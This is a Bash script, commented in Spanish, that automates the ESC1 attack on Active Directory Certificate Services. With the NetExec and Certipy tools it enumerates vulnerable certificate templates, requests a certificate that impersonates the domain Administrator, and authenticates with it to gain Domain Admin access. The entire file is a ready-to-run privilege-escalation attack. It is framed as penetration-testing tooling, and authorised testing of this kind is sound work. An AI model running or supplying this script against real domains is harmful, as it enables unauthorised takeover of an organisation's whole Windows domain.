#!/bash
# ================================================
# AUTO ESC1 - Pentesting AD CS automatizado
# Uso: ./auto_esc1.sh <DC_IP> <DOMAIN> <USER> <PASSWORD> [OUTPUT_DIR]
# ================================================

DC_IP=${1:-"192.168.1.10"}
DOMAIN=${2:-"domain.local"}
USER=${3:-"user"}
PASS=${4:-"pass"}
OUT_DIR=${5:-"$(pwd)/esc1_$(date +%Y%m%d_%H%M)"}

mkdir -p "$OUT_DIR"

echo "[+] Iniciando enumeración de templates con NetExec..."
nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -M adcs 2>/dev/null | \
  grep -i "template.*enabled" | tee "$OUT_DIR/templates.txt"

echo "[+] Buscando templates ESC1 con Certipy..."
certipy-ad find -u "${USER}@${DOMAIN}" -p "$PASS" -dc-ip "$DC_IP" -vulnerable -stdout 2>/dev/null | \
  grep -A5 "ESC1" | grep "Template Name" | awk '{print $NF}' > "$OUT_DIR/esc1_templates.txt"

if [[ ! -s "$OUT_DIR/esc1_templates.txt" ]]; then
  echo "[-] No se encontraron templates ESC1 vulnerables."
  exit 1
fi

echo "[+] Templates ESC1 encontradas:"
cat "$OUT_DIR/esc1_templates.txt"

while read -r template; do
  echo "[+] Solicitando certificado para template: $template (impersonando Administrator)..."
  certipy-ad req -u "${USER}@${DOMAIN}" -p "$PASS" -ca "${DOMAIN^^}-CA" \
    -target "$DC_IP" -template "$template" -upn "administrator@${DOMAIN}" \
    2>/dev/null | tee "$OUT_DIR/req_${template}.log"

  PFX=$(grep -oP 'Saved.*?\K[\w-]+\.pfx' "$OUT_DIR/req_${template}.log" | head -1)

  if [[ -n "$PFX" && -f "$PFX" ]]; then
    echo "[+] Certificado obtenido → $PFX"
    echo "[+] Autenticando como Domain Admin..."
    certipy-ad auth -pfx "$PFX" -dc-ip "$DC_IP" | tee "$OUT_DIR/auth_${template}.log"
    echo "=================================================="
  fi
done < "$OUT_DIR/esc1_templates.txt"

echo "[+] ¡Proceso ESC1 terminado! Resultados en: $OUT_DIR"
